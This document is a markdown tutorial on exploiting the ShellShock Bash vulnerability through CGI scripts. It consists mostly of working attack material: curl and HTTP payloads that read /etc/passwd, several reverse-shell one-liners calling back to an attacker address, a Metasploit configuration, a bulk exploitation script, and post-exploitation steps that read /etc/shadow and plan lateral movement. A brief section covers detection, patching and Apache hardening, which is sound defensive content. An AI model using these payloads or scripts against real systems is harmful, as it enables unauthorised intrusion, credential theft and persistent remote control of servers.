# Exploiting ShellShock (CVE-2014-6271) Vulnerability

## Overview

ShellShock is a critical vulnerability in the Bash shell that allows remote code execution. This family of vulnerabilities affected Bash versions from 1.3 through 4.3 and was discovered in September 2014.

## Key Concepts

### What is ShellShock?

- **Vulnerability Family**: CVE-2014-6271, CVE-2014-7169, and related CVEs
- **Affected Systems**: Linux/Unix systems using vulnerable Bash versions
- **Attack Vector**: Environment variable injection through CGI scripts
- **Impact**: Remote code execution with web server privileges

### How ShellShock Works

Bash incorrectly executes trailing commands when processing specially crafted environment variables:

```bash
# Vulnerable pattern
() { :; }; echo "vulnerable"
```

## Prerequisites for Exploitation

### Required Services

- **Apache Web Server** with CGI support enabled
- **Vulnerable Bash version** (typically < 4.3)
- **Accessible CGI scripts** that interact with Bash

### Tools Required

```bash
# Essential tools
nmap                    # Service discovery
burpsuite              # HTTP interception
metasploit-framework   # Automated exploitation
netcat                 # Reverse shell listener
```

## Reconnaissance Phase

### Service Discovery

```bash
# Basic service scan
nmap -sS -sV -p 80 <target_ip>

# Comprehensive web service scan
nmap -sS -sV -p 80,443,8080 --script http-enum <target_ip>
```

### ShellShock Vulnerability Detection

```bash
# Using nmap script
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi <target_ip>

# Manual detection with curl
curl -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd" http://<target_ip>/cgi-bin/test.cgi
```

## Manual Exploitation

### Identifying CGI Scripts

```bash
# Common CGI script locations
/cgi-bin/
/cgi-bin/test.cgi
/cgi-bin/status.cgi
/cgi-bin/admin.cgi
/gettime.cgi
```

### Manual Exploitation with Burp Suite

#### Step 1: Intercept Request

```http
GET /cgi-bin/test.cgi HTTP/1.1
Host: <target_ip>
User-Agent: Mozilla/5.0...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```

#### Step 2: Inject ShellShock Payload

```http
GET /cgi-bin/test.cgi HTTP/1.1
Host: <target_ip>
User-Agent: () { :; }; /bin/bash -c "echo; echo; /bin/cat /etc/passwd"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```

### Reverse Shell Exploitation

#### Set Up Listener

```bash
# Netcat listener
nc -nlvp 1234

# Alternative with socat
socat file:`tty`,raw,echo=0 tcp-listen:1234
```

#### Craft Reverse Shell Payload

```http
GET /cgi-bin/test.cgi HTTP/1.1
Host: <target_ip>
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<your_ip>/1234 0>&1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```

#### Alternative Reverse Shell Methods

```bash
# Using different payloads
# Bash TCP
/bin/bash -i >& /dev/tcp/<your_ip>/1234 0>&1

# Netcat traditional
nc -e /bin/sh <your_ip> 1234

# Netcat with named pipe
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <your_ip> 1234 >/tmp/f

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Metasploit Framework Exploitation

### Using ShellShock Module

```bash
# Start Metasploit
msfconsole

# Search for ShellShock modules
search shellshock

# Use the Apache mod_cgi module
use exploit/multi/http/apache_mod_cgi_bash_env_exec

# Configure options
set RHOSTS <target_ip>
set TARGETURI /cgi-bin/test.cgi
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444

# Exploit
exploit
```

### Alternative Metasploit Payloads

```bash
# Different payload options
set payload linux/x86/shell/reverse_tcp
set payload linux/x64/meterpreter/reverse_tcp
set payload cmd/unix/reverse_bash
```

## Post-Exploitation

### Initial Access Assessment

```bash
# Basic system information
whoami
id
uname -a
cat /etc/issue
cat /etc/os-release

# Network information
ifconfig
ip addr
netstat -tulpn

# User enumeration
cat /etc/passwd
cat /etc/shadow
```

### Privilege Escalation Reconnaissance

```bash
# SUID files
find / -perm -4000 -type f 2>/dev/null

# Writable directories
find / -perm -222 -type d 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Kernel version
uname -r
```

## Automated Exploitation Scripts

### Custom ShellShock Scanner

```bash
#!/bin/bash
# shellshock_scanner.sh
TARGET=$1
CGI_PATHS=("/cgi-bin/test.cgi" "/cgi-bin/status.cgi" "/cgi-bin/admin.cgi" "/gettime.cgi")

echo "[*] Scanning $TARGET for ShellShock vulnerability"

for path in "${CGI_PATHS[@]}"; do
    echo "[*] Testing $path"
    response=$(curl -s -H "User-Agent: () { :; }; echo; echo; echo VULNERABLE" "http://$TARGET$path")
    if echo "$response" | grep -q "VULNERABLE"; then
        echo "[+] VULNERABLE: $TARGET$path"
        echo "$TARGET$path" >> vulnerable_hosts.txt
    fi
done
```

### Bulk Exploitation Script

```bash
#!/bin/bash
# shellshock_exploit.sh
TARGET=$1
CGI_PATH=$2
LHOST=$3
LPORT=$4

echo "[*] Exploiting ShellShock on $TARGET"

# Test vulnerability
curl -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd" "http://$TARGET$CGI_PATH"

# Send reverse shell
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" "http://$TARGET$CGI_PATH" &
```

## Defense and Mitigation

### Detection Methods

```bash
# Check Bash version
bash --version

# Test for vulnerability
env x='() { :;}; echo vulnerable' bash -c "echo test"

# Monitor web logs for exploitation attempts
grep -r "() { :; }" /var/log/apache2/
```

### Patching and Hardening

```bash
# Update Bash
sudo apt update && sudo apt upgrade bash

# Alternative: Install fixed version
sudo apt-get install --only-upgrade bash

# Disable CGI if not needed
# Comment out CGI modules in Apache configuration
# LoadModule cgi_module modules/mod_cgi.so
```

### Web Server Hardening

```apache
# Apache configuration improvements
# Limit CGI execution to specific directories
<Directory "/var/www/cgi-bin">
    Options +ExecCGI
    AddHandler cgi-script .cgi .pl
    Require all granted
</Directory>

# Disable CGI in other directories
<Directory "/var/www/html">
    Options -ExecCGI
</Directory>
```

## Real-World Attack Scenarios

### Scenario 1: Web Server Compromise

```
1. Discover Apache server with CGI scripts
2. Identify vulnerable CGI endpoint
3. Inject ShellShock payload via User-Agent header
4. Gain reverse shell as www-data user
5. Privilege escalation to root
```

### Scenario 2: Lateral Movement

```
1. Compromise one host via ShellShock
2. Extract credentials and SSH keys
3. Use compromised credentials to access other systems
4. Repeat ShellShock testing on internal systems
```

## Key Takeaways

1. **ShellShock affects CGI scripts** that interact with Bash
2. **Exploitation via HTTP headers** (User-Agent, Cookie, Referer)
3. **Multiple exploitation methods** available (manual, Metasploit, custom scripts)
4. **Post-exploitation crucial** for privilege escalation
5. **Patching essential** - update Bash to latest version
6. **Monitoring required** for detection of exploitation attempts

This comprehensive guide covers both manual and automated exploitation of ShellShock vulnerabilities, providing multiple pathways to gain initial access and maintain persistence on vulnerable Linux systems.
